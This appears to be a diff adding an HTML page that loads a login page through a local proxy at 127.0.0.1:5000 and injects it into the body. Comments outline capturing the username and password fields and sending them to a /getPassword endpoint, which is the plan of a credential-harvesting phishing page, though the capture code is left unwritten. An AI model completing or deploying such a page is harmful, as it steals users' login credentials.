@@ -1,0 +1,36 @@
+<html>
+
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        let newHtml;
+        
+        $(document).ready(function () {
+            $.ajax({
+                url: 'http://127.0.0.1:5000/proxy',
+                success: function (data) {
+                    newHtml = data;
+                    display_html();
+                }
+            });
+        });
+
+        function display_html() {
+            $("body").append(newHtml);
+            
+            // Add a function that runs when login button is pressed
+            
+                //  Get the value of username filed in userLoginId 
+                
+                //  Get the value of password filed in userPassword 
+                
+
+                // Make ajax call to /getPassword and send an object having id and password keys and respective values as data
+                
+        }
+
+    </script>
+</head>
+<body>
+</body>
+</html>
